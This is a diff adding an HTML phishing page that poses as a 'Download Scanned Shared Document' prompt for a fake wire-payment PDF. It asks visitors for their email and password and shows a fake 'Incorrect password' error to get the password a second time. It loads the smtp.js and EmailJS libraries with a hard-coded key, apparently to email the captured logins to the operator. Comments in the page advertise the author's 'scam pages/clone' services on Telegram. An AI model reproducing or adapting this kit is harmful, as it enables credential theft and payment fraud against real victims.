@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>PDF Download Authentication</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto&display=swap"
+      rel="stylesheet"
+    />
+
+    <!-- 
+      ð¨âð» Developed by Vikram Joseph
+      ð± Telegram: https://t.me/vikramjoseph
+      ð¼ Services: Websites, Scam pages/clone, Landing Pages, Web Apps, Mobile Apps
+    -->
+
+    <style>
+      * {
+        box-sizing: border-box;
+      }
+      body {
+        font-family: "Roboto", sans-serif;
+        background: #f2f2f2;
+        margin: 0;
+        padding: 20px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+      }
+      .form-box {
+        background: white;
+        padding: 30px;
+        border-radius: 10px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        width: 100%;
+        max-width: 500px;
+        text-align: center;
+        animation: fadeDown 0.8s ease forwards;
+      }
+      @keyframes fadeDown {
+        from {
+          opacity: 0;
+          transform: translateY(-30px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+      .form-box img {
+        width: 50px;
+        margin-bottom: 10px;
+      }
+      .form-box h4 {
+        margin: 10px 0 5px;
+        font-weight: normal;
+      }
+      .pdf-link {
+        display: inline-block;
+        margin: 10px 0;
+        color: #0066cc;
+        font-size: 14px;
+        text-decoration: none;
+      }
+      .input-container {
+        position: relative;
+        margin: 10px 0;
+      }
+      .input-container svg {
+        position: absolute;
+        top: 10px;
+        left: 10px;
+        width: 16px;
+        height: 16px;
+        fill: #888;
+      }
+      .input-field {
+        width: 100%;
+        padding: 10px 10px 10px 35px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+      }
+      .error-msg {
+        color: red;
+        font-size: 13px;
+        text-align: left;
+        margin-top: 5px;
+      }
+      .download-btn {
+        background-color: #007bff;
+        color: white;
+        border: none;
+        padding: 10px 15px;
+        margin-top: 15px;
+        border-radius: 5px;
+        width: 100%;
+        font-size: 16px;
+        cursor: pointer;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+      .download-btn svg {
+        margin-right: 8px;
+      }
+      .spinner {
+        border: 3px solid #fff;
+        border-top: 3px solid #ccc;
+        border-radius: 50%;
+        width: 16px;
+        height: 16px;
+        animation: spin 1s linear infinite;
+        margin-left: 8px;
+      }
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+      @media (max-width: 480px) {
+        .form-box {
+          padding: 20px;
+        }
+        .download-btn {
+          font-size: 15px;
+          padding: 10px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- 
+      ð¨âð» UI by @vikramjoseph (Telegram)
+      â¡ Custom HTML/CSS/JS for authentication interface
+    -->
+
+    <div class="form-box">
+      <img
+        src="https://upload.wikimedia.org/wikipedia/commons/8/87/PDF_file_icon.svg"
+        alt="PDF Icon"
+      />
+      <h4>Download Scanned Shared Document</h4>
+      <p style="font-size: 13px; color: #666">Authentication required</p>
+      <a href="#" class="pdf-link">ð Electronic_Wire_Payment.pdf</a>
+
+      <!-- Step 1 -->
+      <form id="step1">
+        <div class="input-container">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16">
+            <path
+              d="M3 14s-1 0-1-1 1-4 6-4 6 3 6 4-1 1-1 1H3zm5-6a3 3 0 1 0 0-6 3 3 0 0 0 0 6z"
+            />
+          </svg>
+          <input
+            type="email"
+            class="input-field"
+            id="emailInput"
+            disabled
+            placeholder="Enter your email"
+            required
+          />
+        </div>
+        <button type="submit" class="download-btn" id="step1Btn">
+          <span>Continue</span>
+        </button>
+      </form>
+
+      <!-- Step 2 -->
+      <form id="step2" style="display: none">
+        <div class="input-container">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16">
+            <path
+              d="M3 14s-1 0-1-1 1-4 6-4 6 3 6 4-1 1-1 1H3zm5-6a3 3 0 1 0 0-6 3 3 0 0 0 0 6z"
+            />
+          </svg>
+          <input
+            type="email"
+            class="input-field"
+            id="emailInputView"
+            disabled
+            placeholder="Enter your email"
+          />
+        </div>
+
+        <div class="input-container" id="passwordContainer">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16">
+            <path
+              d="M8 1a4 4 0 0 0-4 4v2H3.5A1.5 1.5 0 0 0 2 8.5v5A1.5 1.5 0 0 0 3.5 15h9a1.5 1.5 0 0 0 1.5-1.5v-5A1.5 1.5 0 0 0 12.5 7H12V5a4 4 0 0 0-4-4zM5 5a3 3 0 1 1 6 0v2H5V5z"
+            />
+          </svg>
+          <input
+            type="password"
+            class="input-field"
+            id="passwordInput"
+            placeholder="Enter password"
+            required
+          />
+        </div>
+
+        <div
+          class="input-container"
+          id="confirmContainer"
+          style="display: none"
+        >
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16">
+            <path
+              d="M8 1a4 4 0 0 0-4 4v2H3.5A1.5 1.5 0 0 0 2 8.5v5A1.5 1.5 0 0 0 3.5 15h9a1.5 1.5 0 0 0 1.5-1.5v-5A1.5 1.5 0 0 0 12.5 7H12V5a4 4 0 0 0-4-4zM5 5a3 3 0 1 1 6 0v2H5V5z"
+            />
+          </svg>
+          <input
+            type="password"
+            class="input-field"
+            id="confirmInput"
+            placeholder="Confirm password"
+          />
+          <div class="error-msg" id="passwordError" style="display: none">
+            Incorrect password
+          </div>
+        </div>
+
+        <button type="submit" class="download-btn" id="step2Btn">
+          <span>Download</span>
+        </button>
+      </form>
+    </div>
+
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="./script.js"></script>
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
+    ></script>
+    <script type="text/javascript">
+      (function () {
+        emailjs.init({
+          publicKey: "RDl-H5GufwilmNdCs",
+        });
+      })();
+    </script>
+    <!-- 
+      ð Functional logic created by Vikram Joseph
+      ð¬ Telegram: https://t.me/vikramjoseph
+      Need a landing page, scam pages/clone, user panel, or app? Contact now!
+    -->
+  </body>
+</html>
